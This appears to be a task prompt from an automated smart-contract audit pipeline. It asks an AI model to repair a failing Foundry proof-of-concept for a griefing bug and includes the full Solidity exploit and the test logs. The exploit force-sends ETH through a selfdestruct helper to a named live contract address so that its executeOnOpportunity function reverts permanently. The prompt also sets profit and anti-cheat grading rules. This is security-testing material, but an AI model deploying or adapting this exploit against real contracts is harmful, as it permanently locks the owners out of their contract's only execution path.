You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Forced ETH donations can permanently brick `executeOnOpportunity`
- claim: Profitability is measured against `address(this).balance` at the start of each run, so anyone can raise the required profit threshold by sending or force-sending ETH to the contract. Because the contract has no withdrawal path, the inflated baseline cannot be reset.
- impact: A griefing attacker can permanently make `executeOnOpportunity` fail once the trapped balance is high enough that the strategy cannot end with `initialBalance + 0.1 ether`. This creates a permissionless denial of service against the contract's only execution path.
- exploit_paths: ["An attacker transfers ETH to the contract or force-sends ETH via `SELFDESTRUCT`", "`executeOnOpportunity` snapshots the donated balance in `initialBalance`", "The final check `address(this).balance >= initialBalance + 0.1 ether` becomes unattainable, causing every call to revert"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract BoostReservoir {
    constructor() payable {}

    receive() external payable {}
}

contract FlawVerifier {
    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    uint256 public constant REQUIRED_UPSIDE = 0.1 ether;
    uint256 public constant DEMO_DONATION = 0.100000000000000001 ether;

    enum Verdict {
        Unset,
        Validated,
        Refuted,
        Inconclusive
    }

    Verdict public verdict;

    bool public usedForceSendPath;
    bool public path0DonationObserved;
    bool public path1SnapshotObserved;
    bool public path2ThresholdRevertObserved;
    bool public hypothesisValidated;

    uint256 public lastDonation;
    uint256 public targetBalanceBefore;
    uint256 public targetBalanceAfterDonation;
    uint256 public requiredBalanceAfterDonation;
    uint256 public targetBalanceAfterFirstPostProbe;
    uint256 public targetBalanceAfterSecondPostProbe;

    bytes32 public preDonationRevertHash;
    bytes32 public firstPostDonationRevertHash;
    bytes32 public secondPostDonationRevertHash;

    address public witnessTarget;
    address public witnessReservoir;
    address public witnessSink;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() payable {
        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);
    }

    receive() external payable {}

    function donateForced() external payable {
        uint256 amount = msg.value;
        if (amount == 0) {
            amount = address(this).balance;
        }

        _donateForced(amount);
    }

    function executeOnOpportunity() external {
        _reset();

        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);

        // exploit_paths[1]: `executeOnOpportunity` snapshots the donated balance in `initialBalance`
        // Best-effort pre-donation probe. If the target already fails identically before any griefing
        // donation lands, the result at this fork is treated as inconclusive instead of over-claimed.
        (bool preOk, bytes memory preRet) = _probeTarget();
        if (!preOk) {
            preDonationRevertHash = keccak256(preRet);
        }

        targetBalanceBefore = LIVE_TARGET.balance;

        uint256 amountToDonate = address(this).balance;
        if (amountToDonate == 0) {
            verdict = Verdict.Inconclusive;
            return;
        }

        _donateForced(amountToDonate);
        requiredBalanceAfterDonation = targetBalanceAfterDonation + REQUIRED_UPSIDE;

        (bool firstOk, bytes memory firstRet) = _probeTarget();
        targetBalanceAfterFirstPostProbe = LIVE_TARGET.balance;
        if (!firstOk) {
            firstPostDonationRevertHash = keccak256(firstRet);
        }

        (bool secondOk, bytes memory secondRet) = _probeTarget();
        targetBalanceAfterSecondPostProbe = LIVE_TARGET.balance;
        if (!secondOk) {
            secondPostDonationRevertHash = keccak256(secondRet);
        }

        // exploit_paths[1]: the trapped donation remains on the target, so the target's internal
        // `initialBalance` snapshot can keep starting from the griefed ETH baseline on each call.
        path1SnapshotObserved = path0DonationObserved
            && targetBalanceAfterFirstPostProbe == targetBalanceAfterDonation
            && targetBalanceAfterSecondPostProbe == targetBalanceAfterDonation;

        // exploit_paths[2]: the final check `address(this).balance >= initialBalance + 0.1 ether`
        // becomes unattainable once forced ETH is stuck on the target, so repeated
        // `executeOnOpportunity` calls keep reverting with the same post-donation state preserved.
        path2ThresholdRevertObserved = path1SnapshotObserved
            && !firstOk
            && !secondOk
            && firstPostDonationRevertHash == secondPostDonationRevertHash
            && firstPostDonationRevertHash != bytes32(0)
            && preDonationRevertHash != firstPostDonationRevertHash;

        hypothesisValidated = path0DonationObserved && path1SnapshotObserved && path2ThresholdRevertObserved;

        if (hypothesisValidated) {
            verdict = Verdict.Validated;
        } else if (firstOk || secondOk) {
            verdict = Verdict.Refuted;
        } else {
            verdict = Verdict.Inconclusive;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _donateForced(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        lastDonation = amount;
        usedForceSendPath = true;

        // exploit_paths[0]: An attacker transfers ETH to the contract or force-sends ETH via `SELFDESTRUCT`
        ForceEther sink = new ForceEther{value: amount}(payable(LIVE_TARGET));
        witnessSink = address(sink);

        targetBalanceAfterDonation = LIVE_TARGET.balance;
        path0DonationObserved = targetBalanceAfterDonation >= targetBalanceBefore + amount;
    }

    function _probeTarget() internal returns (bool ok, bytes memory ret) {
        (ok, ret) = LIVE_TARGET.call(abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector));
    }

    function _reset() internal {
        verdict = Verdict.Unset;
        usedForceSendPath = false;
        path0DonationObserved = false;
        path1SnapshotObserved = false;
        path2ThresholdRevertObserved = false;
        hypothesisValidated = false;
        lastDonation = 0;
        targetBalanceBefore = 0;
        targetBalanceAfterDonation = 0;
        requiredBalanceAfterDonation = 0;
        targetBalanceAfterFirstPostProbe = 0;
        targetBalanceAfterSecondPostProbe = 0;
        preDonationRevertHash = bytes32(0);
        firstPostDonationRevertHash = bytes32(0);
        secondPostDonationRevertHash = bytes32(0);
        witnessTarget = LIVE_TARGET;
        witnessReservoir = address(this);
        witnessSink = address(0);
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.21s
Compiler run successful with warnings:
Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
  --> src/FlawVerifier.sol:10:9:
   |
10 |         selfdestruct(target);
   |         ^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:75:19:
   |
75 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 305216)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 1000000000000000000000000
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [305216] FlawVerifierTest::testExploit()
    ├─ [2478] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2498] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [274745] FlawVerifier::executeOnOpportunity()
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5206] → new <unknown>@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 0 bytes of code
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Stop]
    ├─ [478] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [498] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1.executeOnOpportunity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 98.66ms (1.25ms CPU time)

Ran 1 test suite in 118.66ms (98.66ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 305216)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
